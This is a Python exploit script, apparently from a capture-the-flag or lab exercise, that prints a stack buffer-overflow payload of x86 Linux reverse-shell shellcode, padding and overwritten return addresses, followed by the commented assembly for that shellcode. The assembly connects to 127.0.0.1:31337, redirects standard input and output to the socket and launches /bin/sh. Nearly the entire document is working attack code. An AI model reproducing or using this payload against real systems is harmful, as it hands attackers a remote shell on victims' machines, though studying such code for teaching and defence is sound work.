from __future__ import print_function
from struct import pack

shellcode = 'U\x89\xe51\xc0\x89\xc3P\xb8\x11\x11\x11\x11\xc1\xe0\x1c\xc1\xe8\x1cP\xb8\x12\x11\x11\x11\xc1\xe0\x1c\xc1\xe8\x1cP\x89\xe1\xb0f\xb3\x01\xcd\x80\x89\xc21\xc0\x89\xc3\xb8\x80\x01\x01\x02-\x01\x01\x01\x01Pfhzifj\x02\x89\xe1\xb8\x10\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18PQR1\xc0\x89\xc3\x89\xe1\xb0f\xb3\x03\xcd\x80\x89\xd31\xc9\xb1\x021\xc0\xb0?\xcd\x80Iy\xf71\xc0Ph//shh/bin\x89\xe31\xc9\x89\xca\xb0\x0b\xcd\x80'

print(shellcode + "A" * 0x77E + pack("<I", 0xbffeaa58 - 0x810) + pack("<I", 0xbffeaa58 + 4), end='')

''' Original Assembly Commented
#consulted with "White Hatters Academy"
#whitehatters.academy/assembly-language-and-shellcoding-on-linux-part-3/

.global main
.section .text

main:
	pushl	%ebp
	movl	%esp, %ebp
	
	#create the socket
	#socketcall interrupt is 102 (0x66) the type is 1 sys_socket()
	#socket(AF_INET, SOCK_STREAM, 0)
	#translates to socket(2, 1, 0)

	xor	%eax, %eax		#clear out eax so we can push zeros
	movl	%eax, %ebx		#clear ebx as well
	push	%eax			#push arg 3 (0) on the stack
	mov	$0x11111111, %eax	#push arg 2 (1) on stack
	shl	$28, %eax
	shr	$28, %eax
	push	%eax
	mov	$0x11111112, %eax	#push arg 1 (2) on stack
	shl	$28, %eax
	shr	$28, %eax
	push	%eax
	mov	%esp, %ecx		#args are in stack pointed to by ecx
	mov	$0x66, %al		#sys call number is 102 (0x66)
	mov	$0x1, %bl		#type of call is 1 (0x1)
	int	$0x80			#run system call

	#call to connect
	#socketcall interrupt is still 102(0x66) but type 3 connect()
	#connect(socket, struct sockaddr*, socklen_t)
	#ip = 127.0.0.1 (0x7f.00.00.01) port 31337 (0x7a69)
	#sockaddr = {sa_family= AF_INET, sin_port = htons(31337), sin_addr = 0x7f000001}
call_connect:
	mov 	%eax, %edx		#save the socket file descriptor from previous call
	xor	%eax, %eax		#zero eax
	mov	%eax, %ebx		#zero ebx
	###struct sockaddr
	mov	$0x02010180, %eax	#get the IP backwards + 0x01010101 to avoid null
	sub	$0x01010101, %eax	#get the correct ip
	push	%eax			#put backwards ip on stack for sockaddr

	pushw	$0x697a			#push port backwards
	pushw	$2			#push 2 (AF_INET) 

	mov	%esp, %ecx		#ecx will point to the struct
	###end struct sockaddr
	###connect function setup
	mov	$0x11111110, %eax	#addr_len with padding (16 OR 0X10) for connect
	shl	$24, %eax		#remove padding
	shr	$24, %eax	
	push	%eax			#push addr_len
	push	%ecx			#push on the struct from sockaddr for connect
	push	%edx			#socket file descriptor
	###interrupt function setup
	xor	%eax, %eax		#zero eax
	mov	%eax, %ebx		#zero ebx
	mov	%esp, %ecx		#location of the args for the interrupt
	mov	$0x66, %al		#socketcall interrupt 102(0x66)
	mov	$3, %bl			#call type 3 connect
	int 	$0x80

	#forwarding the output using dup2 systemcall number 63 (0x3f)
	#delete the old fd and create new fd
	#dup2(old fd, new fd)
	#dup2(edx, 0 - 2) replace socket file descriptor with 0 through 2
	#eax - system call 0x3f, ebx - socket fd, ecx - decreamented in loop from 2 to 0

	mov	%edx, %ebx	#move socket fd to ebx
	xor	%ecx, %ecx	#clear ecx
	mov	$2, %cl		#load 2 into ecx for loop

loop_dup2:
	xor	%eax, %eax	#clear eax
	mov	$0x3f, %al	#load function call 63 (0x3f) for int 80
	int	$0x80		#call dup2
	dec	%ecx		#decrement ecx for all 2 through 0 new file descriptors
	jns	loop_dup2	#loop if zero or positive, becomes signed when negative

	###call execve on shell
	###execve(/bin//sh, 0, 0)
	###start the shell
	###interrupt number is 11 (0xb)

	xor	%eax, %eax	#zero out eax
	push	%eax		#null terminator for /bin//sh string
	push	$0x68732f2f	#push //sh backwards
	push	$0x6e69622f	#push /bin backwards
	mov	%esp, %ebx	#address of the string /bin//sh
	xor	%ecx, %ecx	#zero ecx
	mov	%ecx, %edx	#zero edx - the second two arguments of execve
	mov	$0x0b, %al	#system call number 11 (0x0b) in eax
	int	$0x80

	
'''
